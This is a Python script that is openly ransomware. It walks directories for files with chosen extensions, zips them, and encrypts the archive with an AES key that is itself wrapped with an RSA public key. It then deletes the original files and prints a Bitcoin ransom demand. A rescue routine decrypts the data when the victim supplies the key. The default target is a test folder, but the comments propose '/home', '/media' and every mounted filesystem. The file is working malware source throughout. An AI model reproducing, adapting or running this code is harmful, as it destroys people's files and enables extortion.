import os
import sys
import random
import string
import struct
import zipfile
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

# Files:
# ~/.ransom
# data.zip (temp)
# data.enc
# .key (encrypted AES key using RSA public key)
# .clear_key (rescue key)
wd = ['./test_files']  # '/home' '/media'
# ALL option to read fstab and try to mount all its contents and search recursively at each mount point.
extensions = ["txt", "c", "rb", "cpp", "jpg"]
btc_wallet = "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"  # not real


def find_files(wd):
    files = []
    for dirname, dirnames, filenames in os.walk(wd):
        for filename in filenames:
            if filename.split('.')[-1] in extensions:
                files.append(os.path.join(dirname, filename))
    return files


def zip_files(files):
    zipname = os.path.expanduser("~/.ransom/data.zip")
    with zipfile.ZipFile(zipname, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
        for path in files:
            zf.write(path)


def remove_files(files):
    for path in files:
        os.remove(path)


def encrypt_symmetric_key(key):
    file_out = open(os.path.expanduser("~/.ransom/.key"), "wb")
    recipient_key = RSA.importKey(open("key").read())
    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    file_out.write(cipher_rsa.encrypt(key))


def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = ''.join(random.choice(string.digits) for _ in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(str.encode(iv))
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += str.encode(' ' * (16 - len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))


def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)
        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(origsize)


def ransom_data():
    if not os.path.isdir(os.path.expanduser("~/.ransom/")):
        os.mkdir(os.path.expanduser("~/.ransom/"))
    # locate files (save the path to a text file)
    files = []
    for swd in wd:
        files += find_files(swd)
    # compress files
    zip_files(files)
    # encrypt the compressed file with the random string using AES
    key = get_random_bytes(32)
    encrypt_file(key, os.path.expanduser("~/.ransom/data.zip"),
                 out_filename=os.path.expanduser("~/.ransom/data.enc"))
    # store the random string encrypted with the RSA public key .key
    encrypt_symmetric_key(key)
    # delete the files
    remove_files(files)
    os.remove(os.path.expanduser("~/.ransom/data.zip"))
    # display message asking for redemption showing encrypted random string and indicating where to deposit the money.
    print("If you want to recover your files deposit 1 btc at the following address:")
    print(btc_wallet)
    print("The decryption key will be sent to you, once the payment has been confirmed.")
    # can be displayed when logging in, when starting the graphical environment, when opening a shell ...


def rescue_data():
    # pay bitcoins and send encrypted key to attacker
    # attacker (optional)
                 # check bitcoins
                 # decrypt encrypted key with private key
                 # send decrypted .clear_key key and paste into directory
    # insert rescue key
    key = None
    try:
        key = open(os.path.expanduser("~/.ransom/.clear_key"), 'rb').read()
    except:
        print("[-] Pay to get the key and recover your files.\n[-] Deposit the key .clear_key in the directory ~/.ransom/")
        exit(1)
    # decrypt the file
    decrypt_file(key, os.path.expanduser("~/.ransom/data.enc"),
                 out_filename=os.path.expanduser("~/.ransom/data.zip"))
    # decompress
    zip_ref = zipfile.ZipFile(os.path.expanduser("~/.ransom/data.zip"), 'r')
    zip_ref.extractall(os.path.expanduser("~/.ransom/"))
    zip_ref.close()
    # clean
    os.remove(os.path.expanduser("~/.ransom/data.zip"))
    os.remove(os.path.expanduser("~/.ransom/data.enc"))
    os.remove(os.path.expanduser("~/.ransom/.key"))
    os.remove(os.path.expanduser("~/.ransom/.clear_key"))


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "-r":
            rescue_data()
    else:
        ransom_data()
# ALL
# data that can be obtained dynamically in the victim's machine
    # public key (in a file)
    # portfolio management bitcoin
# data sent to the attacker
    # encryption symmetric key rescue request, btc transaction identifier, asymmetric key identifier (if multiple)
